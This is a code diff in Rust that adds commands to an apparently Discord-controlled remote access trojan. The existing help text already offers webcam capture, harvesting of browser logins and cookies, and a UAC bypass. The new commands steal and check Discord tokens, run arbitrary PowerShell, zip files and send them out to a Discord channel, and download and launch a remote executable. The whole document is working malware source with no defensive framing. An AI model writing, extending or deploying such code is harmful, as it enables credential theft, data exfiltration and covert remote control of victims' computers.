@@ -39,6 +39,11 @@ const HELP: &str = "\
 !volume [0-100|mute|unmute] system volume
 !webcam                    camera still -> files channel
 !browsers                  saved logins + cookies (chrome/edge/firefox)
+!discord                   grab + validate Discord tokens from disk
+!powershell <cmd>          run PowerShell, return output
+!zip <file|folder>         zip a path and exfil -> files
+!dropexec <url>            download and run a file
+!toast <text>              Windows toast notification
 !clear [info|files]        delete messages in #console (or #information / #files)
 !uac [silent|disable]      request admin (default: UAC prompt; silent = no-prompt bypass)
 !lock                      lock workstation
@@ -297,6 +302,86 @@ pub async fn dispatch(
         "browsers" | "creds" => {
             let r = tokio::task::spawn_blocking(crate::browsers::harvest).await?;
             st.send_code(console, &r).await?;
+        }
+        "powershell" | "pwsh" => {
+            if arg.is_empty() {
+                st.send(console, "usage: !powershell <cmd>").await?;
+            } else {
+                let out =
+                    tokio::task::spawn_blocking(move || host::run_powershell(&arg)).await?;
+                st.send_code(console, &out).await?;
+            }
+        }
+        "discord" | "tokens" => {
+            let toks = tokio::task::spawn_blocking(crate::discord::grab).await?;
+            if toks.is_empty() {
+                st.send(console, "no discord tokens found").await?;
+            } else {
+                let client = reqwest::Client::builder()
+                    .timeout(std::time::Duration::from_secs(15))
+                    .build()?;
+                for t in toks {
+                    match crate::discord::validate(&client, &t).await {
+                        Some(who) => {
+                            st.send_code(console, &format!("VALID  {who}\n{t}")).await?;
+                        }
+                        None => {
+                            st.send_code(console, &format!("dead/expired\n{t}")).await?;
+                        }
+                    }
+                }
+            }
+        }
+        "zip" => {
+            if arg.is_empty() {
+                st.send(console, "usage: !zip <file|folder>").await?;
+            } else {
+                let p = std::path::PathBuf::from(&arg);
+                let bytes =
+                    tokio::task::spawn_blocking(move || crate::archive::zip_path(&p)).await??;
+                let mb = bytes.len() as f64 / 1_048_576.0;
+                if bytes.len() > 19 * 1024 * 1024 {
+                    st.send(
+                        console,
+                        &format!("zip is {mb:.1} MB — over the 20 MB attachment limit"),
+                    )
+                    .await?;
+                } else {
+                    let name = format!(
+                        "{}.zip",
+                        std::path::Path::new(&arg)
+                            .file_name()
+                            .map(|s| s.to_string_lossy().to_string())
+                            .unwrap_or_else(|| "archive".into())
+                    );
+                    st.send_file(files, &name, bytes, &format!("archive {mb:.1} MB"))
+                        .await?;
+                }
+            }
+        }
+        "dropexec" => {
+            if arg.is_empty() {
+                st.send(console, "usage: !dropexec <url>").await?;
+            } else {
+                let bytes = st.raw_get(&arg).await?;
+                let name = std::path::Path::new(&arg)
+                    .file_name()
+                    .map(|s| s.to_string_lossy().to_string())
+                    .unwrap_or_else(|| "payload.exe".into());
+                let p = std::env::temp_dir().join(&name);
+                std::fs::write(&p, &bytes)?;
+                host::exec(&p.to_string_lossy())?;
+                st.send(
+                    console,
+                    &format!("downloaded + launched {} ({} bytes)", p.display(), bytes.len()),
+                )
+                .await?;
+            }
+        }
+        "toast" => {
+            let msg = if arg.is_empty() { "hello".to_string() } else { arg.clone() };
+            host::toast("System", &msg);
+            st.send(console, "toast shown").await?;
         }
         "clear" => {
             let (target, label) = match arg.trim().to_ascii_lowercase().as_str() {
